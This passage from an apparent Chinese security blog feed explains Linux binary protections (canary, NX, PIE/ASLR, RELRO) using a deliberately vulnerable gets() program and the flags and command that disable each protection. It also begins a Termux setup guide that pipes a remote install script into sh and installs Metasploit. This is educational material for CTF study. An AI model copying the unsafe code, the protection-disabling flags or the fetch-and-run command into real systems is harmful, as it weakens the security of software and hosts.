Gadgets。但是这种方法并不能从本质上解决 SROP 的问题。</p><h2 id="Signal-Frame-Canaries"><a href="#Signal-Frame-Canaries" class="headerlink" title="Signal Frame Canaries"></a>Signal Frame Canaries</h2><p>这种方法借鉴于 Stack Canaries 机制，即在<code>Signal Frame</code>的<code>rt_sigreturn</code>字段之前插入一段随机生成的字节，如果发生 Overflow，则该段字节会被破坏，从而在发生<code>sigreturn</code>之前会被检测到。同时针对 Stack Canaries 的攻击也很多，其同样不能从本质上防止 SROP 的发生。</p><h2 id="Break-kernel-agnostic"><a href="#Break-kernel-agnostic" class="headerlink" title="Break kernel agnostic"></a>Break kernel agnostic</h2><p>这就要追溯到 SROP 的本质问题了，就是内核对 Signal 的不可知性。如果我们在内核处理 <code>sigreturn</code> 系统调用的时候判断一下当前的 Signal Frame 是否是由内核之前创建的，那么这个问题就能从根本上解决。当然，这就涉及到要修改内核的一些底层的设计了，可能也会引入一些新的问题。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop</a><br><a href="https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/uapi/asm/sigcontext.h" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/uapi/asm/sigcontext.h</a><br><a href="https://bestwing.me/stack-overflow-three-SROP.html" target="_blank" rel="noopener">https://bestwing.me/stack-overflow-three-SROP.html</a><br><a href="http://blog.leanote.com/post/3191220142@qq.com/SROP" target="_blank" rel="noopener">http://blog.leanote.com/post/3191220142@qq.com/SROP</a><br><a href="https://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/87447.html</a><br><a href="http://blog.eonew.cn/archives/975" target="_blank" rel="noopener">http://blog.eonew.cn/archives/975</a><br><a href="https://bestwing.me/2017-360chunqiu-online.html" target="_blank" rel="noopener">https://bestwing.me/2017-360chunqiu-online.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;去年学 ROP 的时候遗漏的一个技术。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Linux下的各类程序保护机制</title>
    <link href="blog.b3ale.cn/2020/03/06/Linux%E4%B8%8B%E7%9A%84%E5%90%84%E7%B1%BB%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <id>blog.b3ale.cn/2020/03/06/Linux%E4%B8%8B%E7%9A%84%E5%90%84%E7%B1%BB%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</id>
    <published>2020-03-06T10:59:35.000Z</published>
    <updated>2020-03-20T02:07:20.057Z</updated>
    
    <content type="html"><![CDATA[<p>之前一直在做逆向，快一年没碰 PWN 了，接下来有一堆比赛，赶紧重新 PWN 起来。这里先整理一下 Linux 下的程序保护机制。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>Linux 版本：</p><pre><code class="bash">$ uname -aLinux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</code></pre><p>GCC 版本：</p><pre><code class="bash">$ gcc --versiongcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609Copyright (C) 2015 Free Software Foundation, Inc.This is free software; see the source for copying conditions.  There is NOwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</code></pre><h1 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h1><p><a href="https://github.com/slimm609/checksec.sh/" target="_blank" rel="noopener">Checksec</a> 是用 Shell 编写的一个脚本，它可以用来检查可执行文件属性，例如 PIE, RELRO, PaX, Canaries, ASLR, Fortify Source 等等属性。</p><p><img src="/pics/Linux下的各类程序保护机制/1.png" srcset="/img/loading.gif" alt></p><h1 id="Cannary"><a href="#Cannary" class="headerlink" title="Cannary"></a>Cannary</h1><p>Canary 表示栈保护功能是否开启。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 Shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入 Cookie 信息，当函数真正返回的时候会验证 Cookie 信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将 Cookie 信息给覆盖掉，导致栈保护检查失败而阻止 Shellcode 的执行。在 Linux 中将 Cookie 信息称为 Canary。</p><p>gcc 在 4.2 版本中添加了 <code>-fstack-protector</code> 和 <code>-fstack-protector-all</code> 编译参数以支持栈保护功能，4.9 新增了 <code>-fstack-protector-strong</code> 编译参数让保护的范围更广。故在编译时可以控制是否开启栈保护以及程度。</p><p>测试代码：</p><pre><code class="cpp">#include &lt;stdio.h&gt;int main() {    char buf[20];    gets(buf);    return 0;}</code></pre><h2 id="Default（-fstack-protector）"><a href="#Default（-fstack-protector）" class="headerlink" title="Default（-fstack-protector）"></a>Default（<code>-fstack-protector</code>）</h2><p>默认情况下，开启了 Cannary 保护（即 <code>-fstack-protector</code> 参数），一开始会在栈上存储 Cannary（<code>QWORD PTR fs:0x28</code>），在程序结束时通过异或检查栈上的值是否正确来检查 Cannary 是否被篡改，如果不正确则调用 <code>__stack_chk_fail()</code> 产生报错：</p><pre><code class="asm">0000000000400596 &lt;main&gt;:  400596:    55                       push   rbp  400597:    48 89 e5                 mov    rbp,rsp  40059a:    48 83 ec 20              sub    rsp,0x20  40059e:    64 48 8b 04 25 28 00     mov    rax,QWORD PTR fs:0x28  4005a5:    00 00  4005a7:    48 89 45 f8              mov    QWORD PTR [rbp-0x8],rax  4005ab:    31 c0                    xor    eax,eax  4005ad:    48 8d 45 e0              lea    rax,[rbp-0x20]  4005b1:    48 89 c7                 mov    rdi,rax  4005b4:    b8 00 00 00 00           mov    eax,0x0  4005b9:    e8 c2 fe ff ff           call   400480 &lt;gets@plt&gt;  4005be:    b8 00 00 00 00           mov    eax,0x0  4005c3:    48 8b 55 f8              mov    rdx,QWORD PTR [rbp-0x8]  4005c7:    64 48 33 14 25 28 00     xor    rdx,QWORD PTR fs:0x28  4005ce:    00 00  4005d0:    74 05                    je     4005d7 &lt;main+0x41&gt;  4005d2:    e8 89 fe ff ff           call   400460 &lt;__stack_chk_fail@plt&gt;  4005d7:    c9                       leave  4005d8:    c3                       ret</code></pre><h2 id="fno-stack-protector"><a href="#fno-stack-protector" class="headerlink" title="-fno-stack-protector"></a><code>-fno-stack-protector</code></h2><p><code>-fstack-protector</code> 参数取消对栈的保护，直接编译成程序所对应的汇编：</p><pre><code class="asm">0000000000400526 &lt;main&gt;:  400526:    55                       push   rbp  400527:    48 89 e5                 mov    rbp,rsp  40052a:    48 83 ec 20              sub    rsp,0x20  40052e:    48 8d 45 e0              lea    rax,[rbp-0x20]  400532:    48 89 c7                 mov    rdi,rax  400535:    b8 00 00 00 00           mov    eax,0x0  40053a:    e8 d1 fe ff ff           call   400410 &lt;gets@plt&gt;  40053f:    b8 00 00 00 00           mov    eax,0x0  400544:    c9                       leave  400545:    c3                       ret</code></pre><h1 id="NX（DEP）"><a href="#NX（DEP）" class="headerlink" title="NX（DEP）"></a>NX（DEP）</h1><p>NX 即 No-eXecute（不可执行）的意思，NX（即 Windows 下的 DEP，数据执行保护）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 Shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令。</p><h2 id="Default（-z-noexecstack）"><a href="#Default（-z-noexecstack）" class="headerlink" title="Default（-z noexecstack）"></a>Default（<code>-z noexecstack</code>）</h2><p>默认开始 NX，栈上的数据不可执行：</p><pre><code class="gdb">assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         r--p    /home/beale/Test_Dir/main0x00601000         0x00602000         rw-p    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rw-p    mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p    mapped0x00007ffffffde000 0x00007ffffffff000 rw-p    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h2 id="z-execstack"><a href="#z-execstack" class="headerlink" title="-z execstack"></a><code>-z execstack</code></h2><p>开启栈可执行后，栈上的代码可被执行，同时其他处内存部分都是读写执行全开：</p><pre><code class="gdb">assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         r-xp    /home/beale/Test_Dir/main0x00601000         0x00602000         rwxp    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rwxp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rwxp    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rwxp    mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rwxp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rwxp    mapped0x00007ffffffde000 0x00007ffffffff000 rwxp    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h1 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h1><p>一般情况下 NX 和地址空间分布随机化（ASLR）会同时工作。<a href="https://blog.csdn.net/spenghui/article/details/79910884" target="_blank" rel="noopener">ASLR 不负责代码段以及数据段的随机化工作，这项工作由 PIE 负责；但是只有在开启 ASLR 之后，PIE 才会生效。</a>内存地址随机化机制（Address Space Layout Randomization)，有以下三种情况（具体的 ASLR 和 PIE 的互相作用：<a href="https://www.cnblogs.com/rec0rd/p/7646857.html）：" target="_blank" rel="noopener">https://www.cnblogs.com/rec0rd/p/7646857.html）：</a></p><ol><li>0 - 表示关闭进程地址空间随机化。</li><li>1 - 表示将 mmap 的基址，stack 和 Vdso 页面随机化。</li><li>2 - 表示在 1 的基础上增加 heap 的随机化。</li></ol><p>可以防范基于 ret2libc 方式的针对 DEP 的攻击。ASLR 和 DEP 配合使用，能有效阻止攻击者在堆栈上运行恶意代码。位置独立的可执行区域（Position-Independent Executables）使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（Return-Oriented Programming）方法变得难得多。</p><blockquote><p>Linux 关闭 PIE 的方法：</p><pre><code class="bash">echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></pre></blockquote><h2 id="Default（-no-pie）"><a href="#Default（-no-pie）" class="headerlink" title="Default（-no-pie）"></a>Default（<code>-no-pie</code>）</h2><p>默认不开启。静态分析程序时所得到的地址都是运行时的真实地址，基地址为 0x400000：</p><pre><code class="asm">0000000000400526 &lt;main&gt;:  400526:    55                       push   rbp  400527:    48 89 e5                 mov    rbp,rsp  40052a:    bf c4 05 40 00           mov    edi,0x4005c4  40052f:    e8 cc fe ff ff           call   400400 &lt;puts@plt&gt;  400534:    b8 00 00 00 00           mov    eax,0x0  400539:    5d                       pop    rbp  40053a:    c3                       ret</code></pre><p>与 gdb 调试的时候相同：</p><pre><code class="gdb">───────────────────────────────────── Code ─────────────────────────────────────   0x400521 &lt;frame_dummy+33&gt;:    jmp    0x4004a0 &lt;register_tm_clones&gt;   0x400526 &lt;main&gt;:    push   rbp   0x400527 &lt;main+1&gt;:    mov    rbp,rsp=&gt; 0x40052a &lt;main+4&gt;:    mov    edi,0x4005c4   0x40052f &lt;main+9&gt;:    call   0x400400 &lt;puts@plt&gt;   0x400534 &lt;main+14&gt;:    mov    eax,0x0   0x400539 &lt;main+19&gt;:    pop    rbp   0x40053a &lt;main+20&gt;:    ret</code></pre><h2 id="pie"><a href="#pie" class="headerlink" title="-pie"></a><code>-pie</code></h2><p><code>-fpie</code> 与 <code>-fPIE</code> 效果一样，用于编译；<code>-pie</code> 用于链接。开启 PIE 后的静态反编译结果没有基地址，每次运行时的基地址不同：</p><pre><code class="asm">0000000000000750 &lt;main&gt;: 750:    55                       push   rbp 751:    48 89 e5                 mov    rbp,rsp 754:    48 8d 3d 99 00 00 00     lea    rdi,[rip+0x99]        # 7f4 &lt;_IO_stdin_used+0x4&gt; 75b:    e8 90 fe ff ff           call   5f0 &lt;puts@plt&gt; 760:    b8 00 00 00 00           mov    eax,0x0 765:    5d                       pop    rbp 766:    c3                       ret</code></pre><p>gdb 调试时如下：</p><pre><code class="gdb">───────────────────────────────────── Code ─────────────────────────────────────   0x55555555474b &lt;frame_dummy+43&gt;:    jmp    0x555555554690 &lt;register_tm_clones&gt;   0x555555554750 &lt;main&gt;:    push   rbp   0x555555554751 &lt;main+1&gt;:    mov    rbp,rsp=&gt; 0x555555554754 &lt;main+4&gt;:    lea    rdi,[rip+0x99]        # 0x5555555547f4   0x55555555475b &lt;main+11&gt;:    call   0x5555555545f0 &lt;puts@plt&gt;   0x555555554760 &lt;main+16&gt;:    mov    eax,0x0   0x555555554765 &lt;main+21&gt;:    pop    rbp   0x555555554766 &lt;main+22&gt;:    ret[rip+0x99] : 0x5555555547f4 (&quot;Hello World&quot;)</code></pre><h1 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h1><p>在 Linux 系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处。GCC、GNU linker 以及 Glibc-dynamic linker 一起配合实现了一种叫做 relro（Read Only Relocation）的技术。大概实现就是由 linker 指定程序的一块经过 dynamic linker 处理过 relocation 之后的区域为只读.</p><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对 GOT 攻击。RELRO 为 Partial RELRO，说明对 GOT 表具有写权限。</p><h2 id="Default（-z-lazy）"><a href="#Default（-z-lazy）" class="headerlink" title="Default（-z lazy）"></a>Default（<code>-z lazy</code>）</h2><p>默认情况下对 GOT 表具有写权限。可以看到 <code>puts</code> 和 <code>_libc_start_main</code> 所在的内存部分是可写的：</p><pre><code class="gdb">assassinq$ checksecCANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : Partialassassinq$ got/home/beale/Test_Dir/main:     file format elf64-x86-64DYNAMIC RELOCATION RECORDSOFFSET           TYPE              VALUE0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__0000000000601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.50000000000601020 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         r--p    /home/beale/Test_Dir/main0x00601000         0x00602000         rw-p    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rw-p    mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p    mapped0x00007ffffffde000 0x00007ffffffff000 rw-p    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h2 id="z-norelro"><a href="#z-norelro" class="headerlink" title="-z norelro"></a><code>-z norelro</code></h2><p>没有开启 RELRO 的情况：</p><pre><code class="gdb">assassinq$ checksecCANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : disabledassassinq$ got/home/beale/Test_Dir/main:     file format elf64-x86-64DYNAMIC RELOCATION RECORDSOFFSET           TYPE              VALUE00000000006008a8 R_X86_64_GLOB_DAT  __gmon_start__00000000006008c8 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.500000000006008d0 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         rw-p    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rw-p    mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p    mapped0x00007ffffffde000 0x00007ffffffff000 rw-p    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h2 id="z-now"><a href="#z-now" class="headerlink" title="-z now"></a><code>-z now</code></h2><p>此时无法修改 GOT 表。<code>puts</code> 和 <code>_libc_start_main</code> 所在的内存部分只有读权限：</p><pre><code class="gdb">assassinq$ checksecCANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : FULLassassinq$ got/home/beale/Test_Dir/main:     file format elf64-x86-64DYNAMIC RELOCATION RECORDSOFFSET           TYPE              VALUE0000000000600fe8 R_X86_64_GLOB_DAT  puts@GLIBC_2.2.50000000000600ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.50000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         r--p    /home/beale/Test_Dir/main0x00601000         0x00602000         rw-p    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rw-p    mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p    mapped0x00007ffffffde000 0x00007ffffffff000 rw-p    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>各种安全选择的编译参数如下：</p><ul><li>NX：<code>-z execstack</code> / <code>-z noexecstack</code> (关闭 / 开启)</li><li>Canary：<code>-fno-stack-protector</code> / <code>-fstack-protector</code> / <code>-fstack-protector-all</code> (关闭 / 开启 / 全开启)</li><li>PIE：<code>-no-pie</code> / <code>-pie</code> (关闭 / 开启)</li><li>RELRO：<code>-z norelro</code> / <code>-z lazy</code> / <code>-z now</code> (关闭 / 部分开启 / 完全开启)</li></ul><p><img src="/pics/Linux下的各类程序保护机制/2.png" srcset="/img/loading.gif" alt></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="http://www.gandalf.site/2019/03/linux-pwn.html" target="_blank" rel="noopener">http://www.gandalf.site/2019/03/linux-pwn.html</a><br><a href="https://stackoverflow.com/questions/24465014/gcc-generate-canary-or-not" target="_blank" rel="noopener">https://stackoverflow.com/questions/24465014/gcc-generate-canary-or-not</a><br><a href="https://stackoverflow.com/questions/2463150/what-is-the-fpie-option-for-position-independent-executables-in-gcc-and-ld" target="_blank" rel="noopener">https://stackoverflow.com/questions/2463150/what-is-the-fpie-option-for-position-independent-executables-in-gcc-and-ld</a><br><a href="https://richardustc.github.io/2013-05-21-2013-05-21-pie.html" target="_blank" rel="noopener">https://richardustc.github.io/2013-05-21-2013-05-21-pie.html</a><br><a href="http://liudonghua.com/archives/2014/10/26/gcc_g++%E4%B8%AD%E7%9A%84pic%E4%B8%8Epie/" target="_blank" rel="noopener">http://liudonghua.com/archives/2014/10/26/gcc_g++%E4%B8%AD%E7%9A%84pic%E4%B8%8Epie/</a><br><a href="https://paper.seebug.org/481/" target="_blank" rel="noopener">https://paper.seebug.org/481/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前一直在做逆向，快一年没碰 PWN 了，接下来有一堆比赛，赶紧重新 PWN 起来。这里先整理一下 Linux 下的程序保护机制。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>使用Termux在Android上打造小型Linux服务器</title>
    <link href="blog.b3ale.cn/2020/03/01/%E4%BD%BF%E7%94%A8Termux%E5%9C%A8Android%E4%B8%8A%E6%89%93%E9%80%A0%E5%B0%8F%E5%9E%8BLinux%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>blog.b3ale.cn/2020/03/01/%E4%BD%BF%E7%94%A8Termux%E5%9C%A8Android%E4%B8%8A%E6%89%93%E9%80%A0%E5%B0%8F%E5%9E%8BLinux%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2020-03-01T02:50:30.000Z</published>
    <updated>2020-03-20T02:27:41.193Z</updated>
    
    <content type="html"><![CDATA[<p>使用 Termux 可以在 Android 上获得极佳的终端体验。</p><a id="more"></a><p>一些基础按键就不记录了。然后在 Termux 上的包管理工具有 pkg 和 apt，和 Debian 的基本一样，对我们来说已经很熟悉了。下面只是做一些简短的记录，用于备份。</p><h1 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h1><p>在 Termux 手机界面上可以完美实现 oh-my-zsh 的 agnoster 主题，在 Github 上已经有人实现了对应的安装脚本：</p><pre><code class="bash">sh -c &quot;$(curl -fsSL https://github.com/Cabbagec/termux-ohmyzsh/raw/master/install.sh)&quot;</code></pre><p>具体的安装过程也不列举了，装完后会让我们选主题和字体。成功之后根目录下会有一个 storage 目录，映射了手机系统上的一些文件夹，方便文件传输：</p><pre><code class="bash">$ ls -l storagetotal 24lrwxrwxrwx 1 u0_a146 u0_a146 26 Mar  1 12:45 dcim -&gt; /storage/emulated/0/DCIMlrwxrwxrwx 1 u0_a146 u0_a146 30 Mar  1 12:45 downloads -&gt; /storage/emulated/0/Downloadlrwxrwxrwx 1 u0_a146 u0_a146 30 Mar  1 12:45 movies -&gt; /storage/emulated/0/Movieslrwxrwxrwx 1 u0_a146 u0_a146 30 Mar  1 12:45 music -&gt; /storage/emulated/0/Musiclrwxrwxrwx 1 u0_a146 u0_a146 30 Mar  1 12:45 pictures -&gt; /storage/emulated/0/Pictureslrwxrwxrwx 1 u0_a146 u0_a146 22 Mar  1 12:45 shared -&gt; /storage/emulated/0</code></pre><p>同样，我们可以给 QQ 的文件传输整一个软链接：</p><pre><code class="bash">ln -s /data/data/com.termux/files/home/storage/shared/tencent/QQfile_recv QQ</code></pre><p>如此一来，传输文件就方便了很多：</p><pre><code class="bash">$ ls -al...lrwxrwxrwx 1 u0_a146 u0_a146   70 Mar  1 16:05 QQ -&gt; /data/data/com.termux/files/home/storage/shared/tencent/QQfile_recv...</code></pre><p>还能修改启动时的问候语：</p><pre><code class="bash">cp $PREFIX/etc/motd $PREFIX/etc/motd.bakvim $PREFIX/etc/motd</code></pre><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/1.png" srcset="/img/loading.gif" alt></p><h1 id="Change-apt-sources"><a href="#Change-apt-sources" class="headerlink" title="Change apt-sources"></a>Change apt-sources</h1><p>给 apt 换个清华源：</p><pre><code class="bash">export EDITOR=viapt edit-sources</code></pre><p>修改为以下内容：</p><pre><code class="txt"># The termux repository mirror from TUNA:deb https://mirrors.tuna.tsinghua.edu.cn/termux stable main</code></pre><h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><p>接下来装个 SSH，用电脑连上更方便地进行后续的安装。</p><pre><code class="bash">apt updateapt upgradeapt install openssh</code></pre><p>将电脑的公钥 push 到手机上：</p><pre><code class="bash">adb push ~/.ssh/id_rsa.pub /sdcard/authorized_keys</code></pre><p>在 Termux 中把电脑公钥放在 <code>.ssh</code> 目录下，并设置 authorized_keys 文件为拥有者只读。最后启动服务：</p><pre><code class="bash">cd .sshmv /sdcard/authorized_keys .chmod 400 authorized_keyssshd</code></pre><p>在电脑上转发 adb 端口并连接：</p><pre><code class="bash">adb forward tcp:8022 tcp:8022ssh localhost -p 8022</code></pre><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><p>Python 必不可少。默认 Python 指 Python3，Python2 指 Python2：</p><pre><code class="bash">apt install python2apt install python # python3</code></pre><h1 id="IPython"><a href="#IPython" class="headerlink" title="IPython"></a>IPython</h1><p>IPython 的安装必须有 clang 的依赖，否则会报错：</p><pre><code class="bash">apt install clangpip install ipythonpip3.6 install ipython</code></pre><h1 id="tsu"><a href="#tsu" class="headerlink" title="tsu"></a>tsu</h1><p>用 tsu 替代 su 可以完美实现 root 转换：</p><pre><code class="bash">apt install tsu</code></pre><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/2.png" srcset="/img/loading.gif" alt></p><h1 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h1><p>需要联（ke）网（xue）下载：</p><pre><code class="bash">apt install unstable-repoapt install metasploit</code></pre><p>输入 msfconsole 可以查看效果：</p><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/3.png" srcset="/img/loading.gif" alt></p><p>这个版本也已经有 CVE-2019-0708 的 EXP 了：</p><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/4.png" srcset="/img/loading.gif" alt></p><h1 id="Termux-API"><a href="#Termux-API" class="headerlink" title="Termux-API"></a>Termux-API</h1><p>其它很多软件像是 Nmap、SQLMap 等等，还有 Github 上的项目都基本和 Linux 中一模一样，可以用 